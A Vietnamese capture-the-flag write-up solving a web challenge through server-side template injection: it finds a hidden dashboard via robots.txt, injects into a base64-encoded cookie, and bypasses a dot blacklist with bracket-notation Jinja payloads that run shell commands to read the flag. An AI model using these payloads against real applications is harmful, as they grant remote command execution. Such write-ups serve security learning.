

Login với username tùy ý vào trang thì được trang sau
![image](https://user-images.githubusercontent.com/81417323/163924414-ae80872d-32da-44a0-8961-d2b129f3fa41.png)
Sau khi xem video => chall này dùng ssti nhưng quan trọng là ssti vào đâu ???

Dùng thử dirsearch để xem subdomain có gì đặc biệt không 
```dirsearch -u <url> -f ``` . Ta được kết quả sau
![image](https://user-images.githubusercontent.com/81417323/163926341-f9921d62-f08b-4282-88e5-d844bd6fa8bc.png)

Vào robots.txt : 

![image](https://user-images.githubusercontent.com/81417323/163926455-dd2a7cbd-a39c-4f5b-8588-9eae7054afd5.png)

=> truy cập /dashboard/r1CkA7sL3y

![image](https://user-images.githubusercontent.com/81417323/163926615-1d9e19d8-c255-4c7d-b64d-f55118afa34a.png)

chắc là ssti vào đây :vv. gửi qua burpsuite:

![image](https://user-images.githubusercontent.com/81417323/163926971-81f0e131-7628-42b0-9869-167ac5e56fc2.png)

Đoạn cookie trong req set user là Umljaw== hay Rick khi decode theo base64 => có thể ssti vào đây. Ta thử thay user = e3s3Kjd9fQ== ( base64decode là {{7\*7}}) thì được

![image](https://user-images.githubusercontent.com/81417323/163927552-ffd13b90-d8d5-4864-bde3-6096b0e55c69.png) => ssti vào đây.

ta thử với payload chưa encode sau 
``` {{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}} ```

Kết quả :

![image](https://user-images.githubusercontent.com/81417323/163928206-9adf5da4-b728-4c8d-a27c-fe23c66c815d.png)

=> dấu "." đã bị blacklist 
thử với payload sau
``` {{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('ls')['read']()}} ```

![image](https://user-images.githubusercontent.com/81417323/163936423-08e20b9f-e9eb-4433-a023-80e49b9b75b2.png)

Bingo !! 

payload cuối 
``` {{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('cat flag\x2etxt')['read']()}} ```

![image](https://user-images.githubusercontent.com/81417323/163936819-5cbe8d66-0be8-4158-94c8-089ccaa42db2.png)

FLAG :  BKSEC{50_y0u_kn0w_5571}
